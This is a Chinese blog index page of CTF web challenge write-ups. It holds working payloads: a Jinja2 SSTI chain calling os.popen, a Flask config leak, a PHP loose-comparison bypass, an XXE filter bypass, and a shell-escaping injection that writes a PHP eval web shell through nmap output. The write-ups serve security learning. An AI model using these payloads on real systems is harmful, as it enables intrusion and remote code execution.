<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="铁马冰河入梦来">
<meta property="og:type" content="website">
<meta property="og:title" content="inanb">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="inanb">
<meta property="og:description" content="铁马冰河入梦来">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="inanb">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>inanb</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">inanb</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">昨夜雨疏风骤 浓睡不消残酒</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/14/XML/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.jpg">
      <meta itemprop="name" content="inanb">
      <meta itemprop="description" content="铁马冰河入梦来">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="inanb">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/14/XML/" class="post-title-link" itemprop="url">XML入门</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-03-14 12:21:10 / 修改时间：13:19:18" itemprop="dateCreated datePublished" datetime="2021-03-14T12:21:10+08:00">2021-03-14</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="XML入门"><a href="#XML入门" class="headerlink" title="XML入门"></a>XML入门</h4><p><strong>可扩展<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80">标记语言</a>，<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%A0%87%E5%87%86%E9%80%9A%E7%94%A8%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/6805073">标准通用标记语言</a>的子集，简称XML。是一种用于标记电子文件使其具有结构性的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/5964436">标记语言</a>。</strong></p>
<h5 id="1-引入"><a href="#1-引入" class="headerlink" title="1.引入"></a>1.引入</h5><p>一段标准的xml数据格式：</p>
<p><img src="/images/XML/image-20210314131552521.png" alt="image-20210314131552521"></p>
<p>与HTML 不同，xml注重于数据的储存与传输而不是展示。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/10/buu%E4%B8%A4%E9%81%93SSTI/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.jpg">
      <meta itemprop="name" content="inanb">
      <meta itemprop="description" content="铁马冰河入梦来">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="inanb">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/10/buu%E4%B8%A4%E9%81%93SSTI/" class="post-title-link" itemprop="url">buu两道SSTI</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-03-10 18:55:34 / 修改时间：19:43:48" itemprop="dateCreated datePublished" datetime="2021-03-10T18:55:34+08:00">2021-03-10</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="buu两道SSTI"><a href="#buu两道SSTI" class="headerlink" title="buu两道SSTI"></a>buu两道SSTI</h4><h5 id="1-题目："><a href="#1-题目：" class="headerlink" title="1.题目："></a>1.题目：</h5><h5 id="2-过程："><a href="#2-过程：" class="headerlink" title="2.过程："></a>2.过程：</h5><h6 id="Web-python-template-injection"><a href="#Web-python-template-injection" class="headerlink" title="Web_python_template_injection"></a>Web_python_template_injection</h6><p>进入题目，只有一个页面……随便访问一个：</p>
<img src="/images/buu两道SSTI/image-20210310193328950.png" alt="image-20210310193328950" style="zoom:50%;" />

<p><img src="/images/buu%E4%B8%A4%E9%81%93SSTI/image-20210310193457920.png" alt="image-20210310193457920"></p>
<p>得到配置</p>
<p>这里简单的lipsum方法似乎不行……在不确定的情况下，可以用模板支持的python语句进行遍历：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123;c.__init__.func_globals[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>找到指定的模块并运用即可：</p>
<img src="/images/buu两道SSTI/image-20210310194103588.png" alt="image-20210310194103588" style="zoom:50%;" />

<img src="/images/buu两道SSTI/image-20210310194117771.png" alt="image-20210310194117771" style="zoom:50%;" />

<p>获得flag</p>
<h6 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a>shrine</h6><p>进入题目发现给了python的源码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/shrine/&lt;path:shrine&gt;&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span>(<span class="params">shrine</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>



<p>设置了一个flask对象：app flag大概是被设置到对象的配置文件中</p>
<p>路由中有：/shrine/&lt;path:shrine&gt;</p>
<p>访问并查看源码：</p>
<p><img src="/images/buu%E4%B8%A4%E9%81%93SSTI/image-20210310193240514.png" alt="image-20210310193240514"></p>
<p>SSTI……blaklist</p>
<p>相当于：+s</p>
<p>还会替换 ‘(‘ 和 ‘)’  ……</p>
<blockquote>
<p>这里要注意，config是flask中的变量，记录了整个配置信息。set config=None仅仅是使得此方法无法使用，而不是替换’config‘为’None‘，所以  会返回None。我们仍有其他方法访问config。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;self.__dict__&#125;&#125;也可以得到config，只是同样被禁用了……</span><br></pre></td></tr></table></figure>

<p> <strong>Flask特有的变量和函数</strong></p>
<p>config | request | session | url_for() | get_flashed_messages()</p>
<p>详细方法：<a target="_blank" rel="noopener" href="https://blog.csdn.net/enjolras_fuu/article/details/82229073">https://blog.csdn.net/enjolras_fuu/article/details/82229073</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在url_for.__globals__中，我们可以找到有关app配置的模块current_app</span><br><span class="line">可以通过&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125;来读取当前对象的配置</span><br><span class="line">get_flashed_messages中好像也有……</span><br></pre></td></tr></table></figure>

<blockquote>
<p>或许这种情况应该在这些函数中翻一翻相关的文件……就能找到方法</p>
</blockquote>
<img src="/images/buu两道SSTI/image-20210310193254568.png" alt="image-20210310193254568" style="zoom:67%;" />

<p>获得flag</p>
<blockquote>
<p>两道题是不同的考点，都是基础……</p>
<p>学习了……</p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/10/xctf-lottery/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.jpg">
      <meta itemprop="name" content="inanb">
      <meta itemprop="description" content="铁马冰河入梦来">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="inanb">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/10/xctf-lottery/" class="post-title-link" itemprop="url">xctf-lottery</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-03-10 12:43:53 / 修改时间：13:18:23" itemprop="dateCreated datePublished" datetime="2021-03-10T12:43:53+08:00">2021-03-10</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="xctf-lottery"><a href="#xctf-lottery" class="headerlink" title="xctf-lottery"></a>xctf-lottery</h4><h5 id="1-题目："><a href="#1-题目：" class="headerlink" title="1.题目："></a>1.题目：</h5><h5 id="2-过程："><a href="#2-过程：" class="headerlink" title="2.过程："></a>2.过程：</h5><p>lottery，彩票网站……</p>
<p>攻防世界直接给了附件，实际上题目存在/.git源码泄露：</p>
<img src="/images/xctf-lottery/image-20210310124701047.png" alt="image-20210310124701047" style="zoom:60%;" />

<p>很多php文件，有session的储存，但似乎不是flask session伪造，config里也没有key之类的……大部分操作都集成在api中，api接受json格式的数据。不像Hgame的微积分数学题，可以自动获取公式计算刷分，这里的彩票数字是随机的：</p>
<p><img src="/images/xctf-lottery/image-20210310125320868.png" alt="image-20210310125320868"></p>
<p>那网站哪里会出问题，既没有像样的用户登录，session似乎也没毛病……</p>
<p>原来是php弱比较导致的漏洞：</p>
<p><img src="/images/xctf-lottery/image-20210310130729735.png" alt="image-20210310130729735"></p>
<blockquote>
<p>……</p>
</blockquote>
<p>直接遍历了输入的number，number的正常输入本应该为字符串，但json支持数组</p>
<blockquote>
<p>注意，在使用==比较时，true是可以和任何类型的字符串或数字相等，返回true，当然0和false和null除外（true==0或true==false或true==null）</p>
</blockquote>
<p>可以使用数组传入布尔值达到恒等：</p>
<img src="/images/xctf-lottery/image-20210310131637110.png" alt="image-20210310131637110" style="zoom:80%;" />

<img src="/images/xctf-lottery/image-20210310131712557.png" alt="image-20210310131712557" style="zoom:89%;" />

<blockquote>
<p>刷钱买flag即可……</p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/09/xctf-unagi/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.jpg">
      <meta itemprop="name" content="inanb">
      <meta itemprop="description" content="铁马冰河入梦来">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="inanb">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/09/xctf-unagi/" class="post-title-link" itemprop="url">xctf-unagi</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-03-09 17:11:09 / 修改时间：17:53:27" itemprop="dateCreated datePublished" datetime="2021-03-09T17:11:09+08:00">2021-03-09</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="xctf-unagi"><a href="#xctf-unagi" class="headerlink" title="xctf-unagi"></a>xctf-unagi</h4><h6 id="1-题目："><a href="#1-题目：" class="headerlink" title="1.题目："></a>1.题目：</h6><h6 id="2-过程："><a href="#2-过程：" class="headerlink" title="2.过程："></a>2.过程：</h6><p>进入题目是一个网站导航，有一个上传点：</p>
<img src="/images/xctf-unagi/image-20210305175148141.png" alt="image-20210305175148141" style="zoom:80%;" />

<p>上传新用户到系统……here中是：</p>
<img src="/images/xctf-unagi/image-20210305175416023.png" alt="image-20210305175416023" style="zoom:80%;" />

<p>大概是一个xml的界面，演示了xml格式的用户数据，也就是需要我们上传类似的xml文件来上传新用户。</p>
<p><img src="/images/xctf-unagi/image-20210309171219845.png" alt="image-20210309171219845"></p>
<p>about中提示，应当读取/flag文件</p>
<blockquote>
<p>我一直很困惑于DTD这个东西，即使实体，也是规范……</p>
</blockquote>
<p><img src="/images/xctf-unagi/image-20210309171739424.png" alt="image-20210309171739424"></p>
<p>内部实体，规定了xml的几个元素，与元素的属性：</p>
<p><img src="/images/xctf-unagi/image-20210309171912700.png" alt="image-20210309171912700"></p>
<p>下面的xml数据需要根据DTD已有的定义（“规范”）来组织（这样的标签才会被正确解析？），DTD也可以是外部独立的，便于多个xml格式的文档引用</p>
<blockquote>
<p>假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>eg：</p>
<p><img src="/images/xctf-unagi/image-20210309172332031.png" alt="image-20210309172332031"></p>
<p>（include？</p>
</blockquote>
<p>xxe的朴素运用，就是利用实体，读取内部敏感文件：</p>
<p><img src="/images/xctf-unagi/image-20210309172756732.png" alt="image-20210309172756732"></p>
<p>根据提示的xml结构，构造数据：</p>
<img src="/images/xctf-unagi/image-20210309173533674.png" alt="image-20210309173533674" style="zoom:80%;" />

<blockquote>
<p>除了intro标签其他都有长度限制</p>
<p>intro标签可以在User界面找到</p>
<p>cred标签么有显示，大概是php代码不对这个标签识别</p>
</blockquote>
<p>上传后发现有waf阻挡</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4059">绕过WAF保护的XXE</a>中介绍了编码绕过，有效waf不支持一些编码，可以轻松绕过</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://mohemiv.com/tags/xxe/">https://mohemiv.com/tags/xxe/</a> 这个更详细，可惜全英……</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconv -f utf8 -t utf16 1.xml&gt;2.xml</span><br></pre></td></tr></table></figure>

<p>转换后上传，即得到flag</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3357#toc-19">xxe深度学习</a></p>
<blockquote>
<p>如果目标网站能访问外网，访问个人服务器上的dtd，操作大概会更多一些？……</p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/09/BUUCTF-2018-Online-Tool/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.jpg">
      <meta itemprop="name" content="inanb">
      <meta itemprop="description" content="铁马冰河入梦来">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="inanb">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/09/BUUCTF-2018-Online-Tool/" class="post-title-link" itemprop="url">BUUCTF-2018-Online-Tool</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-03-09 15:05:32 / 修改时间：17:07:10" itemprop="dateCreated datePublished" datetime="2021-03-09T15:05:32+08:00">2021-03-09</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h5 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h5><h6 id="1-题目："><a href="#1-题目：" class="headerlink" title="1.题目："></a>1.题目：</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = $_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $host = $_GET[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(<span class="string">&quot;glzjin&quot;</span>. $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="2-过程："><a href="#2-过程：" class="headerlink" title="2.过程："></a>2.过程：</h6><blockquote>
<p>关于escapeshellarg和escapeshellcmd</p>
<p><strong>escapeshellarg</strong> — 把字符串转码为可以在 shell 命令里使用的参数</p>
<p><strong>功能</strong> ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec(), system() 执行运算符(反引号)</p>
<p><strong>escapeshellcmd</strong> — shell 元字符转义</p>
<p><strong>功能</strong>：escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 <a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.exec.php">exec()</a> 或 <a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.system.php">system()</a> 函数，或者 <a target="_blank" rel="noopener" href="http://php.net/manual/zh/language.operators.execution.php">执行操作符</a> 之前进行转义。</p>
<p>反斜线（\）会在以下字符之前插入： <em>&amp;#;`|\</em>?~&lt;&gt;^()[]{}$<em>, <em>\x0A</em> 和 <em>\xFF\</em>。 \</em>’* 和 <em>“</em> 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 <em>%</em> 和 <em>!</em> 字符都会被空格代替。</p>
</blockquote>
<p>好像因为环境问题？本地测试不是很对……参考dalao：<a href="%5Bhttp://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/%5D(http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/)">谈谈escapeshellarg参数绕过和注入的问题</a></p>
<p>由于先使用<strong>escapeshellarg</strong>，再使用<strong>escapeshellcmd</strong>导致的命令执行漏洞</p>
<p>在线php测试成功了……：</p>
<p><img src="/images/BUUCTF-2018-Online-Tool/image-20210309164414644.png" alt="image-20210309164414644"></p>
<p>‘’   \   ‘’    A    ‘\‘   ‘’  ：这样显示，单引号都被闭合了，传入参数就可以成为命令执行</p>
<p><img src="/images/BUUCTF-2018-Online-Tool/image-20210309165949036.png" alt="image-20210309165949036"></p>
<blockquote>
<p>单引号前后要加空格，防止格式改变或后缀改变</p>
</blockquote>
<p>结合：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/107336#h3-5">利用/绕过 PHP escapeshellarg/escapeshellcmd函数</a></p>
<p>可知，需要利用预置的命令，拼接执行；这里关系到namp的命令</p>
<p>namp命令有保存扫描结果的命令：</p>
<blockquote>
<p><strong>Nmap输出格式</strong></p>
<ul>
<li>-oN <filespec> (标准输出)</li>
<li>-oX <filespec> (XML输出)</li>
<li>-oS <filespec> (ScRipT KIdd|3 oUTpuT)</li>
<li>-oG <filespec> (Grep输出)</li>
<li>-oA <basename> (输出至所有格式)</li>
<li><a target="_blank" rel="noopener" href="http://www.nmap.com.cn/doc/manual.shtm#12">namp中文网#输出</a></li>
</ul>
</blockquote>
<p>在保存结果的同时，可以向文件中写入语句，这里写入一句话即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host&#x3D;&#39; &lt;?php @eval($_POST[&quot;ok&quot;]);?&gt; -oG 1.php &#39;</span><br></pre></td></tr></table></figure>

<p>sandbox指明文件目录，antsword链接：</p>
<p><img src="/images/BUUCTF-2018-Online-Tool/image-20210309170613645.png" alt="image-20210309170613645"></p>
<p>获取flag</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/04/xctf-FlatScience/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.jpg">
      <meta itemprop="name" content="inanb">
      <meta itemprop="description" content="铁马冰河入梦来">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="inanb">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/04/xctf-FlatScience/" class="post-title-link" itemprop="url">xctf-FlatScience</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-03-04 16:56:21 / 修改时间：17:35:02" itemprop="dateCreated datePublished" datetime="2021-03-04T16:56:21+08:00">2021-03-04</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="xctf-FlatScience"><a href="#xctf-FlatScience" class="headerlink" title="xctf-FlatScience"></a>xctf-FlatScience</h4><h6 id="1-题目："><a href="#1-题目：" class="headerlink" title="1.题目："></a>1.题目：</h6><h6 id="2-过程："><a href="#2-过程：" class="headerlink" title="2.过程："></a>2.过程：</h6><p>这道题…………</p>
<p>打开上面写着：Best Papers，最好的论文，链接了好多paper，还是全英的……</p>
<p>查看robots.txt，找到login和admin页面，login页面源码发现注释：</p>
